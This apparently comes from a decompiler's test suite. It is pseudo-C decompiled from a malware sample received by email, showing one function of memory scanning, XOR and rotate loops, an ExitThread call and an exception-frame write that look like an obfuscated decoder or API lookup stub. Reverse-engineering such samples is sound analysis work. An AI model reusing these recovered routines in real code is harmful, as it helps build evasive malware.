// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1155/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004010E2(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, selector fs, word32 dwArg00)
{
fn004010E2_entry:
	def fp
	def dwArg00
	def Mem0
	def ebx
	def fs
l004010E2:
l004010FC:
	di_15 = (word16) (dwArg00 - 0xFFFFFFF9) (alias)
	branch DPB(0x000000DA, 0xDA - Mem0[dwArg00 - 0xFFFFFFF9:byte], 0, 8) == 0x0000004A l0040115C
l00401125:
	ExitThread(dwArg00 - 0xFFFFFFF9)
l0040115C:
	__ror(di_15, 0x07)
	ecx_49 = Mem0[DPB(0x0012FD43, (word16) fp, 0, 16):word32]
	edi_52 = 0x004010B7
	esi_55 = Mem0[0x004010DD:word32]
l00401184:
	ecx_58 = PHI(ecx_49, ecx_60)
	edi_59 = PHI(edi_52, edi_65)
	ecx_60 = ecx_58 - 0xFFFFFFFF
	edi_65 = edi_59 + ebx ^ ebx
	eax_67 = Mem0[ecx_60 + 0x00000000:word32] - esi_55
	branch eax_67 != 0x00000000 l00401184
l00401193:
	__ror(edi_65, 0x13)
	__rol(__rol(DPB(eax_67, Mem0[ecx_60 + 0xFFFFFFFE:word16], 0, 16), 0x0D), 0x16)
	esi_90 = dwArg00
	edx_95 = Mem0[0x00401029:word32]
l004011C8:
	esi_102 = PHI(esi_90, esi_106)
	eax_104 = Mem0[esi_102 + 0x00000000:word32]
	esi_106 = esi_102 - 0xFFFFFFFF
	ecx_110 = eax_104 ^ edx_95
	branch ecx_110 == 0x00000000 l004011E7
l004011DC:
	goto l004011C8
l004011E7:
	eax_125 = __rol(eax_104 * 0x00000002, 0x11)
	edx_135 = __ror(edx_95 + eax_104 * 0x00000002 + (ecx_110 ^ 0x3D77B675), 0x10)
	__ror((word16) (DPB(eax_125, __ror((word16) eax_125, 0x0D), 0, 16) - esi_106), 0x01)
	Mem155[fs:0x00000000:word32] = fp - 0x00000008
	__rol(edx_135, 0x16)
	return
fn004010E2_exit:
}

